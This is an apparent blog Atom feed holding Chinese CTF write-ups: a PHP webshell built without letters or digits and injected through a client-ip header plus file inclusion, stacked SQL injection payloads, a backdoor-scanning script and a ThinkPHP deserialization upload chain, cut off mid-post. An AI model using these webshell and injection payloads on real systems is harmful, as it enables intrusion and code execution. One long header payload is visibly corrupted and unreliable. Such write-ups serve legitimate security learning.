<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Somnus&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://Foxgrin.github.io/"/>
  <updated>2019-05-29T18:58:44.590Z</updated>
  <id>https://Foxgrin.github.io/</id>
  
  <author>
    <name>Somnus</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>不含数字和字母的webshell</title>
    <link href="https://Foxgrin.github.io//posts/20456/"/>
    <id>https://Foxgrin.github.io//posts/20456/</id>
    <published>2019-05-29T15:31:00.000Z</published>
    <updated>2019-05-29T18:58:44.590Z</updated>
    
    <content type="html"><![CDATA[<p>通过中南大学院赛的一道Web题学习一下如何在过滤数字和字母的情况下编写出webshell<a id="more"></a></p><p>本题来自于中南大学院赛的一道Web题，题目名字为<strong>badip</strong></p><p>题目如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\badip\1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>看起来像是道sql注入题，但是尝试了一下<code>?id=1&#39;</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\badip\2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>像是过滤了单引号，再尝试<code>1%23</code>，<code>1 order by 100%23</code>都得到id=1的结果，看起来又不像是注入题，题目名为<strong>badip</strong>，没有找到考点，只能尝试扫一扫后台</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\badip\3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现了文件<strong>robots.txt</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\badip\4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>访问后发现存在两个文件：<strong>include.php</strong>和<strong>phpinfo.php</strong></p><p>访问<strong>include.php</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\badip\5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>存在<strong>lfi</strong>，那么就用伪协议读一下<strong>index.php</strong>吧</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\badip\7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>解码一下得源码：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\badip\6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>在源码末尾处发现采用<strong>sql预编译</strong>，那么就不用考虑注入了，忽略这段代码，让我们把目光放在前半部分得代码：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\badip\8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>我们可以发现，当参数<strong>id</strong>包含<code>#|\&quot;|&#39;|sleep|benchmark|outfile|dumpfile|load_file|join</code>时，后台将会把我们得客户ip记录在<strong>txt文件</strong>中，并且源码中也告诉了我们参数<strong>ip</strong>取值自<code>$_SERVER[&#39;HTTP_CLIENT_IP&#39;]</code>，是可以通过头部字段：<code>client-ip</code>进行控制，也有将记录的<strong>txt文件</strong>路径返回给我们</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\badip\9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这时又想到前面的<strong>lfi</strong>，思路便很清晰了，我们可以通过在<strong>client-ip</strong>注入webshell，再利用<strong>lfi</strong>包含写入webshell的<strong>txt文件</strong>即可</p><p>那么唯一需要注意的地方就是对<strong>ip</strong>参数的过滤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&apos;/[a-z0-9]/is&apos;,$ip)) &#123;</span><br><span class="line">        echo &quot;you bad bad ~ &quot;;</span><br><span class="line">        die;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>不能包含数字和字母，这就想到了之前看到的p神的一篇文章：<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">一些不包含数字和字母的webshell</a></p><p>编写不含数字和字母的webshell，思路总结一句话便是：利用合法字符（即非数字，字母的字符）通过各种变换，拼接出字符串<code>assert</code>，再利用php支持<strong>动态函数执行</strong>的特性，将字符串<code>assert</code>当成函数以动态执行</p><p>如果在php7中，<code>assert</code>是一个<strong>语言结构</strong>而不是函数，不能再作为函数名而动态执行，但是在本题中，给出了<strong>phpinfo.php</strong>文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\badip\10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>说明了版本为5.6，所以我们就可以毫无顾虑的构造<code>assert</code>了</p><p>这里我采用了p神指出的第三种方法来构造<code>assert</code>，这就需要利用php的一个特性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在处理字符变量的算数运算时，PHP 沿袭了 Perl 的习惯，而非 C 的。例如，在 Perl 中 $a = &apos;Z&apos;; $a++; 将把 $a 变成&apos;AA&apos;，而在 C 中，a = &apos;Z&apos;; a++; 将把 a 变成 &apos;[&apos;（&apos;Z&apos; 的 ASCII 值是 90，&apos;[&apos; 的 ASCII 值是 91）。注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。递增／递减其他字符变量则无效，原字符串没有变化。</span><br></pre></td></tr></table></figure><p>这个特性简单地说就是：<code>&#39;a&#39;++ == &#39;b&#39;</code>，<code>&#39;b&#39;++ == &#39;c&#39;</code>，我们只需要拿到一个变量，其值为<code>a</code>或者<code>A</code>，再利用自增操作来分别得到<code>assert</code>或者<code>ASSERT</code>的各个字符，因为php函数<strong>大小写不敏感</strong></p><p>那么如何拿到字符<code>a</code>或者<code>A</code>呢，我们知道数组<code>Array</code>的第一个字符便是<code>A</code>，而php中数组与字符连接时，数组将自动转化为字符串<code>Array</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\badip\11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>那么构造<code>ASSERT</code>代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$_ = [];</span><br><span class="line">$_ = <span class="string">"$_"</span>; <span class="comment">//$_ == "Array"</span></span><br><span class="line">$_ = $_[<span class="string">'!'</span> == <span class="string">'@'</span>]; <span class="comment">//$_ == 'A'</span></span><br><span class="line">$__ = $_; <span class="comment">//$__ == 'A'</span></span><br><span class="line">$___ = $_; <span class="comment">//$___ == 'A'</span></span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">//$__ == 'S'</span></span><br><span class="line">$___ .= $__;</span><br><span class="line">$___ .= $__; <span class="comment">//$___ == 'ASS'</span></span><br><span class="line">$__ = $_; <span class="comment">//$__ == 'A'</span></span><br><span class="line">$__++;$__++;$__++;$__++; <span class="comment">//$__ == 'E'</span></span><br><span class="line">$___ .= $__; <span class="comment">//$___ == 'ASSE'</span></span><br><span class="line">$__ = $_; <span class="comment">//$__ == 'A'</span></span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">//$__ == 'R'</span></span><br><span class="line">$___ .= $__; <span class="comment">//$___ == 'ASSER'</span></span><br><span class="line">$__ = $_; <span class="comment">//$__ == 'A'</span></span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">//$__ == 'T'</span></span><br><span class="line">$___ .= $__; <span class="comment">//$___ == 'ASSERT'</span></span><br></pre></td></tr></table></figure><p>同样原理构造<code>POST</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$__ = $_; <span class="comment">//$__ == 'A'</span></span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">//$__ == 'P'</span></span><br><span class="line">$____ = <span class="string">'_'</span>.$__; <span class="comment">//$____ == '_P'</span></span><br><span class="line">$__ = $_; <span class="comment">//$__ == 'A'</span></span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">//$__ == 'O'</span></span><br><span class="line">$____ .= $__; <span class="comment">//$____ == '_PO'</span></span><br><span class="line">$__ = $_; <span class="comment">//$__ == 'A'</span></span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// $__ == 'S'</span></span><br><span class="line">$____ .= $__; <span class="comment">//$____ == '_POS'</span></span><br><span class="line">$__ = $_; <span class="comment">//$__ == 'A'</span></span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">//$__ == 'T'</span></span><br><span class="line">$____ .= $__; <span class="comment">//$____ == '_POST'</span></span><br></pre></td></tr></table></figure><p>最后构造<code>ASSERT($_POST[_])</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_ = $$____;</span><br><span class="line">$___($_[_]);</span><br></pre></td></tr></table></figure><p>另外我们还要考虑到标签<code>&lt;?php ?&gt;</code>的问题，如果在php配置中开启配置<code>short_open_tag  = On</code>，则可以直接短标签<code>&lt;? ?&gt;</code>，我们在phpinfo中确认一下</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\badip\12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>配置<code>short_open_tag</code>开启，所以最后我们构造头部参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">client-ip=&lt;? $_ = [];$_ = @&quot;$_&quot;;$_ = $_[&apos;!&apos; == &apos;@&aposapos;_&apos;;$____.=$__;$__ = $_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____ .= $__;$__ = $_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____ .= $__;$__ = $_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____ .= $__;$_____=$$____;$___($_____[_]); ?&gt;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\badip\13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再利用文件包含执行命令即可获得flag</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\badip\14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure>]]></content>
    
    <summary type="html">
    
      ctf
    
    </summary>
    
      <category term="ctf" scheme="https://Foxgrin.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://Foxgrin.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2019强网杯Web部分题解</title>
    <link href="https://Foxgrin.github.io//posts/42551/"/>
    <id>https://Foxgrin.github.io//posts/42551/</id>
    <published>2019-05-28T16:15:00.000Z</published>
    <updated>2019-05-29T04:15:43.367Z</updated>
    
    <content type="html"><![CDATA[<p>最近到了考试月忙着复习，强网杯没时间打，只能趁着晚上熬夜偷鸡来复现了（考试月真心累…）<a id="more"></a></p><h3 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h3><p>本题docker环境：<a href="https://github.com/CTFTraining/qwb_2019_supersqli" target="_blank" rel="noopener">https://github.com/CTFTraining/qwb_2019_supersqli</a> </p><p>题目如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\QWB\1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>测试发现利用正则匹配过滤了关键字：<code>select</code>，<code>update</code>，<code>drop</code>，<code>delete</code>，<code>insert</code>，<code>where</code>等</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\QWB\2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这么狠的过滤还是第一次见到，如果正常而言真的是没有办法注入了，但是这题源码是能够支持<strong>堆叠查询</strong>的</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\QWB\3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>我们可以看一下php手册中对函数<code>mysqli_multi_query</code>的说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_multi_query() 函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔。</span><br></pre></td></tr></table></figure><p>在sql-labs 38关中也有对堆叠注入进行了特别的说明</p><p>下面我们就先利用堆叠注入看看表名，payload：<code>http://127.0.0.1:8302/?inject=0%27;show%20tables;</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\QWB\4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>表名有<code>words</code>和<code>1919810931114514</code></p><p>我们再分别看看两个表分别的结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8302/?inject=0%27;show%20columns%20from%20`words`;</span><br><span class="line">http://127.0.0.1:8302/?inject=0%27;show%20columns%20from%20`1919810931114514`;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\QWB\5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\QWB\6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这里需要特别注意表<strong>1919810931114514</strong>时一定要通过<code></code>符号进行包裹，不然会报错</p><p>所以我们可以得出该数据库下的表结构：</p><ul><li>words<ul><li>id int(10)</li><li>data varchar(20)</li></ul></li><li>1919810931114514<ul><li>flag varchar(100)</li></ul></li></ul><p>由于flag在1919810931114514表中，那么源码查询的sql语句就为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from `words` where id=&apos;$id&apos;;</span><br></pre></td></tr></table></figure><p>由于过滤了<strong>select</strong>关键字，我们可以使用<strong>预编译</strong>的方法来进行sql查询，另外<code>alter</code>和<code>rename</code>未被过滤，所以我们也可以通过修改表名和表的结构的方法来查询flag，所以这题有两种解题方法</p><h4 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h4><p>预编译的语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set @sql=concat(&apos;selec&apos;,&apos;t flag from `1919810931114514`&apos;);</span><br><span class="line">prepare presql from @sql;</span><br><span class="line">execute presql;</span><br><span class="line">deallocate prepare presql;</span><br></pre></td></tr></table></figure><p>构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8302/?inject=0%27;set%20@sql=concat(%27selec%27,%27t%20flag%20from%20`1919810931114514`%27);prepare%20presql%20from%20@sql;execute%20presql;deallocate%20prepare%20presql;</span><br></pre></td></tr></table></figure><p>结果显示：<code>strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;);</code></p><p>由于函数<code>strstr</code>是<strong>区分大小写</strong>的，所以我们用大小写混合绕过即可</p><p>最后的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8302/?inject=0%27;Set%20@sql=concat(%27selec%27,%27t%20flag%20from%20`1919810931114514`%27);Prepare%20presql%20from%20@sql;execute%20presql;deallocate%20Prepare%20presql;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\QWB\7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h4 id="修改表名和表结构"><a href="#修改表名和表结构" class="headerlink" title="修改表名和表结构"></a>修改表名和表结构</h4><p>修改表名语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RENAME TABLE tablename1 TO tablename2;</span><br></pre></td></tr></table></figure><p>修改表中的列语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE tablename CHANGE column1 column2 varchar(100);</span><br></pre></td></tr></table></figure><p>那么解题思路如下：</p><ul><li>将<strong>words</strong>表修改为<strong>word</strong>表</li><li>将<strong>1919810931114514</strong>表修改为<strong>words</strong>表</li><li>将列<strong>flag</strong>修改为列<strong>id</strong></li></ul><p>根据源程序的sql语句：<code>select * from words where id=&#39;$id&#39;;</code></p><p>就可以直接查询出flag了</p><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8302/?inject=0%27;RENAME%20TABLE%20`words`%20TO%20`word`;RENAME%20TABLE%20`1919810931114514`%20TO%20`words`;ALTER%20TABLE%20`words`%20CHANGE%20`flag`%20`id`%20varchar(100)%20CHARACTER%20SET%20utf8%20COLLATE%20utf8_general_ci%20NOT%20NULL;show%20columns%20from%20`words`;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\QWB\32.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>此时我们已经成功的将列<strong>flag</strong>修改成了<strong>id</strong></p><p>最后用<code>1&#39; or &#39;1</code>查询出flag</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\QWB\8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h3><p>本题docker环境：<a href="https://github.com/CTFTraining/qwb_2019_smarthacker" target="_blank" rel="noopener">https://github.com/CTFTraining/qwb_2019_smarthacker</a> </p><p><img src="\img\QWB\9.png" alt=""></p><p>下载备份源码<strong><a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a></strong></p><p>可以发现是一堆带有疑似一句话木马的参数</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\QWB\10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>但是很多参数都是不能用的，例如上图列举的某个参数已经<strong>事先赋值</strong>了，所以我们需要在众多文件中寻找出可以利用的一句话木马参数</p><p>搜索可得知文件中使用的命令函数大概有3种：<code>eval</code>，<code>assert</code>，<code>system</code></p><p>编写脚本进行搜索：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line"></span><br><span class="line">filenames = os.listdir(<span class="string">'/var/www/html/src'</span>)</span><br><span class="line">pattern = re.compile(<span class="string">r'\$_[GEPOST]&#123;3,4&#125;\[.*\]'</span>)</span><br><span class="line">command = [<span class="string">'uname'</span>,<span class="string">"system('uname');"</span>]</span><br><span class="line">flag = <span class="string">'Linux'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> filenames:</span><br><span class="line">print(name)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'/var/www/html/src/'</span>+name) <span class="keyword">as</span> f:</span><br><span class="line">data = f.read()</span><br><span class="line">result = pattern.findall(data)</span><br><span class="line"><span class="keyword">for</span> ret <span class="keyword">in</span> result:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">passwd = re.findall(<span class="string">r"'(.*)'"</span>,ret)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="string">'GET'</span> <span class="keyword">in</span> ret:</span><br><span class="line"><span class="keyword">for</span> com <span class="keyword">in</span> command:</span><br><span class="line">r = requests.get(<span class="string">'http://127.0.0.1/src/'</span>+name+<span class="string">'?'</span>+passwd+<span class="string">'='</span>+command)</span><br><span class="line"><span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">print(<span class="string">"backdoor in:"</span>,name)</span><br><span class="line">print(<span class="string">"GET:"</span>,passwd)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">elif</span> <span class="string">'POST'</span> <span class="keyword">in</span> ret:</span><br><span class="line"><span class="keyword">for</span> com <span class="keyword">in</span> command:</span><br><span class="line">data = &#123;</span><br><span class="line">passwd:command</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(<span class="string">'http://127.0.0.1/src/'</span>+name,data=data)</span><br><span class="line"><span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">print(<span class="string">"backdoor in:"</span>,name)</span><br><span class="line">print(<span class="string">"POST:"</span>,passwd)</span><br><span class="line"><span class="keyword">except</span>:<span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>运行脚本后发现后门存在于<strong>xk0SzyKwfzw.php</strong>，木马参数为<strong>Efa5BVG</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\QWB\11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\QWB\12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>最后直接连上查找flag即可</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\QWB\13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>本题docker环境：<a href="https://github.com/CTFTraining/qwb_2019_upload" target="_blank" rel="noopener">https://github.com/CTFTraining/qwb_2019_upload</a></p><p>题目如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\QWB\14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>随意注册一个用户，登陆可以发现有<strong>上传文件</strong>功能</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\QWB\15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>随便上传一个木马测试一下，发现后台对<strong>图片内容</strong>做了检测，在文件头加入<strong>GIF89A</strong>后可以上传马</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\QWB\16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>上传后再次登陆用户后，可以发现页面回显出了我们上传文件的路径</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\QWB\17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>访问该路径</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\source\img\QWB\18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\QWB\19.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现我们上传的php文件是被为了png文件，因为没有找到存在文件包含的点，所以无奈只能扫描后台，看看有没有什么遗漏的提示文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\QWB\20.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>果然，发现了备份文件<strong><a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a></strong>，既然有源码那么就是考察<strong>代码审计</strong>了</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\QWB\21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>下载下来后，发现是一个thinkphp框架，那么就先查看一下框架下的路由信息(<strong>tp5/route/route.php</strong>)</p><p>接下来，再找应用部分(<strong>tp5/application/web/controller/Index.php</strong>)</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\QWB\22.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>值得关注的点是函数<strong>login_check</strong>中的变量<strong>profile</strong>取自cookie中的<strong>user</strong>属性，之后对<strong>profile</strong>进行了<strong>反序列化</strong>，那么这里就可能存在通过cookie注入进行的<strong>反序化的点</strong></p><p>我们继续审计<strong>controller</strong>下的其他文件，看看什么可以加以利用的地方</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\QWB\23.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>在<strong>Profile.php</strong>文件的方法<strong>upload_img</strong>中，有一个通过<strong>copy</strong>函数进行<strong>上传文件移动</strong>的操作，跟踪其中的参数<strong>$this-&gt;filename_tmp</strong>和<strong>$this-&gt;filename</strong>和操作执行的条件参数<strong>$this-&gt;ext</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\QWB\24.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现都是<strong>Profile</strong>类的<strong>公有属性</strong>，都是可以通过反序列化进行控制赋值的，所以暂时的思路就是利用反序列化将我们上传的png图片马修改为php文件木马</p><p>那么，如何让<strong>Profile</strong>类执行<strong>upload_img</strong>方法呢，让我们继续审计</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\QWB\25.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>在<strong>Profile</strong>类的末尾处，还发现了两个魔术方法：<code>__get</code>和<code>__call</code>，这两个魔术方法分别代表了在调用类的<strong>不可访问成员属性</strong>和<strong>不可访问方法</strong>时的处理方法。<code>__get</code>会从<strong>$this-&gt;except</strong>中查找不可访问的属性值，该变量也是可控的；<code>__call</code>会调用该类的成员变量所指代变量的所指代的方法</p><p>所以，审计到目前，思路更新如下：</p><ul><li><p>通过cookie注入<strong>user</strong>属性进行反序列化</p></li><li><p>触发<strong>Profile</strong>类的<code>__call</code>魔术方法，使其执行该类的<strong>upload_img</strong>方法将png图片马修改为php文件马</p></li></ul><p>那么问题又来了，我们知道要触发<code>__call</code>魔术方法，就必须要让<strong>Profile</strong>类调用一个该类中不存在的方法，所以我们只能继续审计，继续寻找利用点</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\QWB\26.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>在<strong>Register.php</strong>的末尾了，我们又发现了一个魔术方法<code>__destruct</code>，该方法在类被销毁时自动触发。我们可以发现该方法一经触发，并且参数<strong>$this-&gt;registed</strong>为0时，就可以调用成员<strong>$this-&gt;checker</strong>的<strong>index</strong>方法</p><p>跟踪这两个参数<strong>$this-&gt;registed</strong>和<strong>$this-&gt;checker</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\QWB\27.png" alt="" title="">                </div>                <div class="image-caption"></div>            